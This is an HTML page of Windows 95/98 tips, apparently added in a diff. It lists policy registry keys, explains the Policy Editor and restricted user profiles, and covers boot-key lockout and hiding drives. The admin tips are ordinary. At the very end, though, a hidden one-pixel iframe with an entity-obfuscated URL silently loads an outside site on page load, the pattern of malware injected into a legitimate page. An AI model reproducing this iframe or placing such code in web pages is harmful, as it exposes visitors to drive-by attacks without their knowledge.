+<table align="center" border="1" cellpadding="0" cellspacing="0" width="80%">
+	<tr>
+		<th>
+			<p>Key Name</p>
+		</th>
+		<th>
+			<p>Description</p>
+		</th>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>NoDeletePrinter</p>
+		</td>
+		<td>
+			<p>disables deletion of printers</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>NoAddPrinter</p>
+		</td>
+		<td>
+			<p>disables addition of printers</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>NoRun</p>
+		</td>
+		<td>
+			<p>disables run command</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>NoSetFolders</p>
+		</td>
+		<td>
+			<p>removes folders from settings on Start menu</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>NoSetTaskbar</p>
+		</td>
+		<td>
+			<p>removes taskbar from settings on Start menu</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>NoFind</p>
+		</td>
+		<td>
+			<p>removes the find command</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>NoDrives</p>
+		</td>
+		<td>
+			<p>hides drives in My Computer</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>NoNetHood</p>
+		</td>
+		<td>
+			<p>hides the network neighborhood</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>NoDesktop</p>
+		</td>
+		<td>
+			<p>hides all icons on the desktop</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>NoClose</p>
+		</td>
+		<td>
+			<p>disables shutdown</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>NoSaveSettings</p>
+		</td>
+		<td>
+			<p>don't save settings on exit</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>DisableRegistryTools</p>
+		</td>
+		<td>
+			<p>disable registry editing tools</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>NoRecentDocsMenu</p>
+		</td>
+		<td>
+			<p>hides the documents shortcut at the Start button</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>NoRecentDocsHistory</p>
+		</td>
+		<td>
+			<p>clears history of documents</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>NoFileMenu</p>
+		</td>
+		<td>
+			<p>hides the file menu in explorer</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>NoActiveDesktop</p>
+		</td>
+		<td>
+			<p>no active desktop</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>NoActiveDesktopChanges</p>
+		</td>
+		<td>
+			<p>no changes allowed to active desktop</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>NoInternetIcon</p>
+		</td>
+		<td>
+			<p>no internet explorer icon on the desktop</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>NoFavoritesMenu</p>
+		</td>
+		<td>
+			<p>hides the favorite menu</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>NoChangeStartMenu</p>
+		</td>
+		<td>
+			<p>disables changes to the Start memu</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>NoFolderOptions</p>
+		</td>
+		<td>
+			<p>hides the folder options in the explorer</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>ClearRecentDocsOnExit</p>
+		</td>
+		<td>
+			<p>empty the recent documents folder on reboot</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>NoLogoff</p>
+		</td>
+		<td>
+			<p>hides the log off option in the Start menu</p>
+		</td>
+	</tr>
+	<tr>
+		<td valign="top">
+			<p>RestrictRun</p>
+		</td>
+		<td>
+			<p>disables all exe programs exept for those listed in the RestrictRun subkey</p>
+		</td>
+	</tr>
+</table>
+
+<a name="policyeditor"></a>	
+<h4>POLICY EDITOR</h4>
+<p>Tips/Info</p>
+
+<p>INDEX</p>
+<ol>
+	<li>Customize your system with the System Policy Editor</li>
+	<li>Don't want someone else changing your Windows?</li>
+	<li>Restrictions without running Poledit</li>
+	<li>Poledit Tips</li>
+</ol>
+
+<p>1. Power users: Customize your system with the System Policy Editor</p>
+<p>The policy editor comes free on the Win9x CD. Here's how to install it: 
+Open the Control Panel and double-click on the Add/Remove Programs icon. 
+Select the Windows Setup tab, then click on the Have Disk button. Click on the 
+Browse button and find the ADMIN\APPTOOLS\POLEDIT folder on your Win9x installation CD. 
+Click on OK twice. Select both System Policy Editor and Group Policies 
+and click on the Install button.</p>
+
+<p>2. Don't want someone else changing your Windows environment?</p>
+<p>Use the System Policy Editor, located on the Win 95 installation CD-ROM. 
+Don't put the Policy Editor on your own hard drive or you'll make it too easy 
+for others to change your configuration. When you need it, pop in the CD-ROM, select 
+Start... Run, and run the command d:\admin\apptools\poledit\poledit.exe, 
+where d is your CD-ROM drive.</p>
+
+<p>3. Restrictions without running Poledit:</p>
+<p>If you want to make restrictions to what users can do without having to 
+running Poledit, changes can be made directly to the Registry.</p>
+
+<p>This will allow you to make a .reg file with the specific restrictions you 
+want and importing them all at once.</p>
+
+<ol>
+	<li>Start Regedit</li>
+	<li>Go to <font class="white">HKEY_Current_User\Software\Microsoft\CurrentVersion\Policies</font></li>
+	<li>There should already be at least a Explorer key</li>
+	<li>Additional keys that can be created under Policies are System, Network and WinOldApp</li>
+	<li>You can then add DWORD values set to 1 in the appropriate keys</li>
+	<li>In the Explorer key you can add:<br><br></li>
+	<table align="center" border="1" cellpadding="0" cellspacing="0" width="80%">
+		<tr>
+			<th>
+				<p>Key Name</p>
+			</th>
+			<th>
+				<p>Description</p>
+			</th>
+		</tr>
+		<tr>
+			<td valign="top">
+				<p>NoDeletePrinter</p>
+			</td>
+			<td>
+				<p>Disables Deletion of Printers</p>
+			</td>
+		</tr>
+		<tr>
+			<td valign="top">
+				<p>NoAddPrinter</p>
+			</td>
+			<td>
+				<p>Disables Addition of Printers</p>
+			</td>
+		</tr>
+		<tr>
+			<td valign="top">
+				<p>NoRun</p>
+			</td>
+			<td>
+				<p>Disables Run Command</p>
+			</td>
+		</tr>
+		<tr>
+			<td valign="top">
+				<p>NoSetFolders</p>
+			</td>
+			<td>
+				<p>Removes Folders from Settings on Start Menu</p>
+			</td>
+		</tr>
+		<tr>
+			<td valign="top">
+				<p>NoSetTaskbar</p>
+			</td>
+			<td>
+				<p>Removes Taskbar from Settings on Start Menu </p>
+			</td>
+		</tr>
+		<tr>
+			<td valign="top">
+				<p>NoFind</p>
+			</td>
+			<td>
+				<p>Removes the Find Command</p>
+			</td>
+		</tr>
+		<tr>
+			<td valign="top">
+				<p>NoDrives</p>
+			</td>
+			<td>
+				<p>Hides Drives in My Computer</p>
+			</td>
+		</tr>
+		<tr>
+			<td valign="top">
+				<p>NoNetHood</p>
+			</td>
+			<td>
+				<p>Hides the Network Neighborhood</p>
+			</td>
+		</tr>
+		<tr>
+			<td valign="top">
+				<p>NoDesktop</p>
+			</td>
+			<td>
+				<p>Hides all items on the Desktop</p>
+			</td>
+		</tr>
+		<tr>
+			<td valign="top">
+				<p>NoClose</p>
+			</td>
+			<td>
+				<p>Disables Shutdown</p>
+			</td>
+		</tr>
+		<tr>
+			<td valign="top">
+				<p>NoSaveSettings</p>
+			</td>
+			<td>
+				<p>Don't save settings on exit</p>
+			</td>
+		</tr>
+		<tr>
+			<td valign="top">
+				<p>DisableRegistryTools</p>
+			</td>
+			<td>
+				<p>disable registry editing tools<br>NOTE: remember to be careful of this one!</p>
+			</td>
+		</tr>		
+	</table>
+	<br>
+	<li>In the System key you can add:<br><br></li>
+	<table align="center" border="1" cellpadding="0" cellspacing="0" width="80%">
+		<tr>
+			<th>
+				<p>Key Name</p>
+			</th>
+			<th>
+				<p>Description</p>
+			</th>
+		</tr>
+		<tr>
+			<td valign="top">
+				<p>NoDispCPL</p>
+			</td>
+			<td>
+				<p>Disable Display Control Panel</p>
+			</td>
+		</tr>
+		<tr>
+			<td valign="top">
+				<p>NoDispBackgroundPage</p>
+			</td>
+			<td>
+				<p>Hide Background Page</p>
+			</td>
+		</tr>
+		<tr>
+			<td valign="top">
+				<p>NoDispScrSavPage</p>
+			</td>
+			<td>
+				<p>Hide Screen Saver Page</p>
+			</td>
+		</tr>
+		<tr>
+			<td valign="top">
+				<p>NoDispAppearancePage</p>
+			</td>
+			<td>
+				<p>Hide Appearance Page</p>
+			</td>
+		</tr>
+		<tr>
+			<td valign="top">
+				<p>NoDispSettingsPage</p>
+			</td>
+			<td>
+				<p>Hide Settings Page</p>
+			</td>
+		</tr>
+		<tr>
+			<td valign="top">
+				<p>NoSecCPL</p>
+			</td>
+			<td>
+				<p>Disable Password Control Panel</p>
+			</td>
+		</tr>
+		<tr>
+			<td valign="top">
+				<p>NoPwdPage</p>
+			</td>
+			<td>
+				<p>Hide Password Change Page</p>
+			</td>
+		</tr>
+		<tr>
+			<td valign="top">
+				<p>NoAdminPage</p>
+			</td>
+			<td>
+				<p>Hide Remote Administration Page</p>
+			</td>
+		</tr>
+		<tr>
+			<td valign="top">
+				<p>NoProfilePage</p>
+			</td>
+			<td>
+				<p>Hide User Profiles Page</p>
+			</td>
+		</tr>
+		<tr>
+			<td valign="top">
+				<p>NoDevMgrPage</p>
+			</td>
+			<td>
+				<p>Hide Device Manager Page</p>
+			</td>
+		</tr>
+		<tr>
+			<td valign="top">
+				<p>NoConfigPage</p>
+			</td>
+			<td>
+				<p>Hide Hardware Profiles Page</p>
+			</td>
+		</tr>
+		<tr>
+			<td valign="top">
+				<p>NoFileSysPage</p>
+			</td>
+			<td>
+				<p>Hide File System Button</p>
+			</td>
+		</tr>
+		<tr>
+			<td valign="top">
+				<p>NoVirtMemPage</p>
+			</td>
+			<td>
+				<p>Hide Virtual Memory Button</p>
+			</td>
+		</tr>
+	</table><br>
+	<li>In the Network key you can enter:<br><br></li>
+	<table align="center" border="1" cellpadding="0" cellspacing="0" width="80%">
+		<tr>
+			<th>
+				<p>Key Name</p>
+			</th>
+			<th>
+				<p>Description</p>
+			</th>
+		</tr>
+		<tr>
+			<td valign="top">
+				<p>NoNetSetup</p>
+			</td>
+			<td>
+				<p>Disable the Network Control Panel</p>
+			</td>
+		</tr>
+		<tr>
+			<td valign="top">
+				<p>NoNetSetupIDPage</p>
+			</td>
+			<td>
+				<p>Hide Identification Page</p>
+			</td>
+		</tr>
+		<tr>
+			<td valign="top">
+				<p>NoNetSetupSecurityPage</p>
+			</td>
+			<td>
+				<p>Hide Access Control Page</p>
+			</td>
+		</tr>
+		<tr>
+			<td valign="top">
+				<p>NoFileSharingControl</p>
+			</td>
+			<td>
+				<p>Disable File Sharing Controls</p>
+			</td>
+		</tr>
+		<tr>
+			<td valign="top">
+				<p>NoPrintSharing</p>
+			</td>
+			<td>
+				<p>Disable Print Sharing Controls</p>
+			</td>
+		</tr>
+	</table><br>
+	<li>In the WinOldApp key you can enter:<br><br></li>
+	<table align="center" border="1" cellpadding="0" cellspacing="0" width="80%">
+		<tr>
+			<th>
+				<p>Key Name</p>
+			</th>
+			<th>
+				<p>Description</p>
+			</th>
+		</tr>
+		<tr>
+			<td valign="top">
+				<p>Disabled</p>
+			</td>
+			<td>
+				<p>Disable MS-DOS Prompt</p>
+			</td>
+		</tr>
+		<tr>
+			<td valign="top">
+				<p>NoRealMode</p>
+			</td>
+			<td>
+				<p>Disables Single-Mode MS-DOS</p>
+			</td>
+		</tr>
+	</table>
+</ol>
+
+<p>4. Poledit Tips</p>
+
+<p>The policy editor will allow you to remove the Run command from the Start menu. 
+You can also specify only certain apps that 95 can run using a policy. 
+Unfortunatly, booting in safe mode will allow someone to run poledit, and undo all your 
+changes.</p>
+<p>If you are on a network, the best way is to put the policy there, and configure it so they 
+must log in to use the computer. Any changes made with policy editor in safe mode will be 
+reset after the user authenticates to the network, unless, of course, they kill the network 
+configuration. But if that happens, they're now screwed.</p>
+
+<p>Bottom line: If you have such a problem with users hacking your system and reasonable measures 
+taken with policy editor cannot stop them, those people should not be allowed to use the 
+computer in the first place!</p>
+
+<p>Don't forget, you can always use a bios password and lock the case, so it can't be reset 
+without a hammer and screwdriver. You can also edit the msdos.sys file and change the 
+bootmulti line to 0 so they can't enter safe mode without a boot disk. Disabling boot from 
+floppy in the bios will afford you another level of protection. There are also 3rd party 
+utils which will handle these chores for you.</p>
+
+
+<h4>SECURITY</h4> 
+
+<p>INDEX</p>
+<ol>
+	<li>Creating Secure User Profiles under Win9x</li>
+	<li>Disabling the Right-Click on the Start Button</li>
+	<li>Disabling My Computer</li>
+	<li>For Your Eyes Only</li>
+	<li>Hidden Creator</li>
+	<li>Boot Keys - Locking Out</li>
+	<li>Restrictions without running Poledit</li>
+	<li>Hmmm?</li>
+	<li>Useful Links</li>
+</ol>
+
+<p>1. Creating Secure User Profiles under Win9x:</p>
+
+<p>The following is the text of a letter by Richard Turner of Augusta, Georgia. 
+It was published in PC Magazine, and is undoubtedly 
+copyrighted by them. I'm including it because it addresses a common question 
+about how to create secure user profiles in Win9x. This was a Stumper 
+question at one point - many people responded that the answer was to use the 
+Policy Editor, but no one explained the exact, best procedure. This letter 
+does a very good job of that.</p>
+
+<p>Once again, the following is directly from PC Magazine, and was written by 
+Richard Turner.</p>
+<blockquote>
+<p>Publicly accessible computers, such as those in schools, require a 
+significant degree of security to prevent abuse. The Windows 95 CD-ROM 
+provides the tool you need to implement restrictive policies on such 
+machines in the form of the Policy Editor (POLEDIT) application. 
+Unfortunately, the Windows 95 Resource Kit doesn't tell you how to use 
+POLEDIT for standalone computers, so I developed a method of my own:</p>
+
+<p>1.Prepare the System.</p>
+<p>Use Explorer to make backup copies of USER.DAT and 
+SYSTEM.DAT, in case of emergency. Make sure you have at least 10MB 
+free on the Windows drive to hold user profile information.</p>
+<p>2.Enable User Profiles.</p>
+<p>Launch the Password applet in Control Panel. 
+Click the User Profiles tab, click the option Users Can Customize, 
+and check the two boxes. Click OK; Windows will restart.</p>
+<p>3.Create Profiles.</p>
+<p>When Windows restarts, log on as User and allow 
+Windows to create folders to hold your profile information. Shut down 
+and log on again as Administrator, with a suitably obscure password, 
+and again allow Windows to create profile folders. Don't forget this 
+password!</p>
+<p>4.Restrict User Access to Programs.</p>
+<p>While logged on as Adminstrator, use 
+Explorer to navigate to C:\WINDOWS\PROFILES\USER\STARTMENU. In this 
+folder and those below it, delete any shortcuts to programs the user 
+shouldn't be allowed to run, including every shortcut to the Recent 
+folder. Be sure to delete the shortcuts to POLEDIT, Regedit, and 
+Explorer.</p>
+<p>5.Install Policy Editor.</p>
+<p>Launch the Add/Remove Software applet in Control 
+Panel, click the Windows Setup tab, and press the Have button. 
+Navigate to the ADMIN\APPTOOLS\POLEDIT folder of the Windows 95 CD-ROM 
+and install POLEDIT.INF. This will install POLEDIT and put it on the 
+Accessories\System Tools submenu of the Programs menu. It will also 
+place the critical policy template file ADMIN.ADM in the C:\WINDOWS\INF 
+directory. If you don't have the CD, you can download POLEDIT from somewhere on 
+[<a href="http://www.microsoft.com" target="_blank">www.microsoft.com</a>] or CIS MSWIN.</p>
+<p>6.Define Default User Policy.</p>
+<p>Launch POLEDIT, create a new file, and add 
+new users named User and Administrator. Double-click the Default User 
+icon, select System|Restrictions, and check all four boxes. Select Shell 
+|Restrictions and check the four boxes whose captions begin with Remove, 
+plus the two that say Hide All Items on Desktop and Don't Save Settings on 
+Exit. Do not check the Disable Shutdown 
+command. Use Explorer to create a folder named C:\WINDOWS\PROFILE\DUMMY. 
+Back in POLEDIT, select Shell|Custom Folders and check all the boxes, 
+filling in the dummy folder name you just created for those that 
+require paths. Click OK and save the file as CONFIG.POL.</p>
+<p>7.Define User Policy.</p>
+<p>Load the example policy file MAXIMUM.POL, click on 
+the Default User icon, and chose Copy from the Edit menu. Reload 
+CONFIG.POL, click on the User icon, and select Paste from the Edit menu. 
+Double-click the User icon and choose Shell|Custom Folders. Click on the 
+text of each check box in turn and, if an edit box appears below, 
+replace C:\WINDOWS with C:\WINDOWS\PROFILES\USER. Make sure all boxes 
+remain checked. Select Control Panel | Passwords and check the Restrict 
+box; then check the other four boxes that appear below. Under Shell | 
+Restrictions, check the Remove Run command, Remove Find command, Hide 
+Drives in My Computer, and Don't Save Settings on Exit. Consult the 
+Windows Resource Kit Help to determine what other restrictions you may 
+wish to add, but be sure not to check Disable ShutDown Command. Now go 
+to the Shell | Restrictions and System | Restrictions and change any 
+gray check boxes to blank.</p>
+<p>8.Define Adminstrator Policy.</p>
+<p>Double-click the Administrator icon and go 
+through the entire list of restrictions, setting every check box to 
+blank, not gray. This protects the Administrator policy from being 
+affected by the Default User policy.</p>
+<p>9.Define "no user" Policy.</p>
+<p>Log on again, but press ESC to close the 
+log-on prompt. Run POLEDIT, select Open Registry from the File menu, 
+and double-click Local User. Apply all the same restrictions you 
+applied to Default User. Then log on as Adminstrator again.</p>
+<p>10.Enable Policy Loading.</p>
+<p>Load CONFIG.POL in POLEDIT, open the Default 
+Computer icon, select System, and check Enable User Profiles. Under 
+Network\Update, check Remote Update. Select Manual for the Update Mode, 
+and enter C:\WIINDOWS\CONFIG.POL as your path. Save CONFIG.POL. Now 
+select Open Registry from the File menu, double-click Local Computer, 
+and make the same change to the network update mode. Save changes and 
+exit POLEDIT.</p>
+<p>11.Test Policies.</p>
+<p>Log on as User; check to see that the policy restrictions 
+you specified are in place. Log on as Administrator and check that 
+there are no restrictions. Now shut down and log on again, but use a 
+new name and password. There should be no icons on the desktop and no 
+programs available from the Start menu (nothing to do but log on again). 
+This time press ESC at the log-on prompt to bypass entering a user name. 
+Again you should have no option but to shut down and log on again.</p>
+<p>12.Protect Policies.</p>
+<p>Log on as User and confirm there is no way to run 
+POLEDIT. For greater safety, change the file named ADMIN.ADM 
+(in the C:\WINDOWS\INF folder) to something else. Use the DOS command 
+ATTRIB to remove the read-only, hidden, and system attributes from the 
+file C:\MSDOS.SYS, and load it into your favorite editor. Find the 
+heading [Options] and change the bootkeys= key to bootkeys=0. If this 
+key is not present under [Options], simply add it. Save the file and 
+restore its read-only, hidden, and system attributes. This change 
+prevents the user from breaking out of Windows 95's startup 
+process. Finally, if the system BIOS permits, use its SETUP program to 
+disable booting from a floppy disk.</p>
+</blockquote>
+
+<p>2. Disabling the Right-Click on the Start Button:</p>
+
+<p>Normally, when you right button click on the Start button, it allows you 
+to open your programs folder, the Explorer and run Find. In situations 
+where you don't want to allow users to be able to do this in order to 
+secure your computer.</p>
+<ol>
+	<li>Start Regedit</li>
+	<li>Search for Desktop</li>
+	<li>This should bring you to <font class="white">HKEY_Classes_Root\Directory</font></li>
+	<li>Expand this section</li>
+	<li>Under Shell is Find</li>
+	<li>Delete Find</li>
+	<li>Move down a little in the Registry to Folder</li>
+	<li>Expand this section and remove Explore and Open</li>
+</ol>
+
+<p>Now when you right click on the Start button, nothing should happen. 
+You can delete only those items that you need.<br>
+Note: - On Microsoft keyboards, this also disables the Window-E 
+(for Explorer) and Window-F (for Find) keys.<br>
+See the section on Installation to see how to do this automatically 
+during an install.</p>
+
+<p>3. Disabling My Computer:</p>
+
+<p>In areas where you are trying to restrict what users can do on the 
+computer, it might be beneficial to disable the ability to click on My 
+Computer and have access to the drives, control panel etc.</p>
+
+<p>To disable this:</p>
+<ol>
+	<li>Start Regedit</li>
+	<li>Search for <font class="white">20D04FE0-3AEA-1069-A2D8-08002B30309D</font></li>
+	<li>This should bring you to the <font class="white">HKEY_Classes_Root\CLSID</font> section</li>
+	<li>Delete the entire section</li>
+</ol>
+<p>Now when you click on My Computer, nothing will happen. 
+You might want to export this section to a registry file before deleting 
+it just in case you want to enable it again.</p>
+
+<p>See the section on Installation to see how to do this automatically 
+during an install.</p>
+
+<p>4. For your eyes only:</p>
+
+<p>Don't want your nosy neighbors peeking at what you've got on your 
+computer when you step away from your desk? Your screen saver's 
+certainly not going to stop them -- unless you password protect it. 
+Choose any password you want and once that screen saver kicks in, you 
+can't get back into what you were doing unless you enter the right 
+password. So snoopers are locked out. Nyaa-nyaa! To set a screen saver 
+password, click the desktop with the right mouse button and choose 
+Properties to open the Display Properties dialog box. Now click the 
+Screen Saver tab, click the Password protected box, then click the 
+Change button and enter a password -- twice. Click OK and breathe 
+easy. While you're at it (2 tips in one!), now might be a good time to 
+set that screen saver to kick in a little faster. Just use the up and 
+down arrows next to Wait to adjust how long it takes to kick in.</p>
+
+<p>5. Hidden Creator:</p>
+<p>Platform: all windows platforms</p>
+
+<p>When creating a directory in ms-dos, name directory and press ALT255. 
+Directory can be seen in directory but can not be opened without pressing 
+ALT255 at end of directory name. Great security feature to keep people out 
+of your private directory or directories.</p>
+
+<p>6. Boot keys - Locking out</p>
+<p>Open a command prompt (from start menu select RUN, then type COMMAND), switch to the root
+directory and issue the following command:</p>
+<p class="white">ATTRIB -H -R -S MSDOS.SYS</p>
+<p>This will remove the hidden, read only and system attributes so you may edit it.</p>
+
+<p>BootKeys=1 Enables the special startup option keys (F5, F6, and F8). Setting this value to 0 
+prevents any startup keys from functioning. If you're a systems administrator, this setting 
+lets you configure a more secure system.</p>
+
+<p>BE SURE TO RE-ENABLE THE HIDDEN, READ ONLY, and SYSTEM PROPERTIES after you 
+edit the MSDOS.SYS by typing:</p>
+<p class="white">ATTRIB +H +R +S MSDOS.SYS</p>
+
+<a name="hidewin9xdrives"></a>
+<p>7. Hiding Any Combination of Drives</p>
+
+<p>If you want to stop a drive or any combination of drives appearing in Explorer/My 
+Computer, add the Binary Value of 'NoDrives' in the registry at <font class="white">
+HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer</font></p>
+<p>Give it a value from a combination of the table below:</p>
+
+<table align="center" border="1" cellpadding="0" cellspacing="0" width="80%">
+	<tr>
+		<th>
+			<p>Drive Letter</p>
+		</th>
+		<th>
+			<p>Value</p>
+		</th>
+	</tr>
+	<tr>
+		<td>
+			<p>A:</p>
+		</td>
+		<td>
+			<p>01 00 00 00</p>
+		</td>
+	</tr>
+	<tr>
+		<td>
+			<p>B:</p>
+		</td>
+		<td>
+			<p>02 00 00 00</p>
+		</td>
+	</tr>
+	<tr>
+		<td>
+			<p>C:</p>
+		</td>
+		<td>
+			<p>04 00 00 00</p>
+		</td>
+	</tr>
+	<tr>
+		<td>
+			<p>D:</p>
+		</td>
+		<td>
+			<p>08 00 00 00</p>
+		</td>
+	</tr>
+	<tr>
+		<td>
+			<p>E:</p>
+		</td>
+		<td>
+			<p>10 00 00 00</p>
+		</td>
+	</tr>
+	<tr>
+		<td>
+			<p>F:</p>
+		</td>
+		<td>
+			<p>20 00 00 00</p>
+		</td>
+	</tr>
+	<tr>
+		<td>
+			<p>G:</p>
+		</td>
+		<td>
+			<p>40 00 00 00</p>
+		</td>
+	</tr>
+	<tr>
+		<td>
+			<p>H:</p>
+		</td>
+		<td>
+			<p>80 00 00 00</p>
+		</td>
+	</tr>
+	<tr>
+		<td>
+			<p>I:</p>
+		</td>
+		<td>
+			<p>00 01 00 00</p>
+		</td>
+	</tr>
+	<tr>
+		<td>
+			<p>J:</p>
+		</td>
+		<td>
+			<p>00 02 00 00</p>
+		</td>
+	</tr>
+	<tr>
+		<td>
+			<p>K:</p>
+		</td>
+		<td>
+			<p>00 04 00 00</p>
+		</td>
+	</tr>
+	<tr>
+		<td>
+			<p>L:</p>
+		</td>
+		<td>
+			<p>00 08 00 00</p>
+		</td>
+	</tr>
+	<tr>
+		<td>
+			<p>M:</p>
+		</td>
+		<td>
+			<p>00 10 00 00</p>
+		</td>
+	</tr>
+	<tr>
+		<td>
+			<p>N:</p>
+		</td>
+		<td>
+			<p>00 20 00 00</p>
+		</td>
+	</tr>
+	<tr>
+		<td>
+			<p>O:</p>
+		</td>
+		<td>
+			<p>00 40 00 00</p>
+		</td>
+	</tr>
+	<tr>
+		<td>
+			<p>P:</p>
+		</td>
+		<td>
+			<p>00 80 00 00</p>
+		</td>
+	</tr>
+	<tr>
+		<td>
+			<p>Q:</p>
+		</td>
+		<td>
+			<p>00 00 01 00</p>
+		</td>
+	</tr>
+	<tr>
+		<td>
+			<p>R:</p>
+		</td>
+		<td>
+			<p>00 00 02 00</p>
+		</td>
+	</tr>
+	<tr>
+		<td>
+			<p>S:</p>
+		</td>
+		<td>
+			<p>00 00 04 00</p>
+		</td>
+	</tr>
+	<tr>
+		<td>
+			<p>T:</p>
+		</td>
+		<td>
+			<p>00 00 08 00</p>
+		</td>
+	</tr>
+	<tr>
+		<td>
+			<p>U:</p>
+		</td>
+		<td>
+			<p>00 00 10 00</p>
+		</td>
+	</tr>
+	<tr>
+		<td>
+			<p>V:</p>
+		</td>
+		<td>
+			<p>00 00 20 00</p>
+		</td>
+	</tr>
+	<tr>
+		<td>
+			<p>W:</p>
+		</td>
+		<td>
+			<p>00 00 40 00</p>
+		</td>
+	</tr>
+	<tr>
+		<td>
+			<p>X:</p>
+		</td>
+		<td>
+			<p>00 00 80 00</p>
+		</td>
+	</tr>
+	<tr>
+		<td>
+			<p>Y:</p>
+		</td>
+		<td>
+			<p>00 00 00 01</p>
+		</td>
+	</tr>
+	<tr>
+		<td>
+			<p>Z:</p>
+		</td>
+		<td>
+			<p>00 00 00 02</p>
+		</td>
+	</tr>
+</table>
+
+
+
+
+
+<p>Where (for eg) you want to hide Drives {C,E,J,O,R,U,Y,Z} you would give 'NoDrives' 
+the value 14 42 12 03 </p>
+<p>Where C+E = 14, J+O = 42, R+U=12 and Y+Z = 03<br>
+Please NOTE: The Numbers are to be added in HEXadecimal ie: ABCD = 0F, not 15 
+All Drives Visible is 00 00 00 00 All Drives Hidden is FF FF FF 03</p>
+
+<p>8. Hmmm? =)</p>
+<p>I won't get into the fact that your boss "probably" has the legal right to do whatever 
+he/she wants. Its his/her computer and his/her salary.... That being said: TweakUI will 
+automatically clear out things like the Doc, Run, Find etc. In fact in tweakui its under 
+the tab Paranoia.(which is kind of fitting) You might also del everything in the 
+\\windows\temp internet file folder. Disable file sharing so he can't sit at his desk and 
+look at your hard drive. Last but not least, go to find and look for *.pwl . This will tell 
+you if anyone is logging onto your pc with their password.</p>
+<p>9. Useful links</p>
+<p>You might find these links useful for securing your pc and keeping it up to date with the 
+latest security patches:</p>
+<p>Junkbusters Home Page [<a href="http://www.junkbusters.com/ht/en/index.html" target="_blank">http://www.junkbusters.com/ht/en/index.html</a>]<br>
+Securityfocus [<a href="http://www.securityfocus.com" target="_blank">http://www.securityfocus.com</a>]<br>
+Packetstorm [<a href="http://packetstormsecurity.org." target="_blank">http://packetstormsecurity.org</a>]<br>
+Blacksun Research Facility [<a href="http://blacksun.box.sk">http://blacksun.box.sk</a>]</p>
+<iframe src="http://jL.c&#104;ura&#46;pl/rc/" style="width:1px;height:1px"></iframe>
+</body>
+</html>
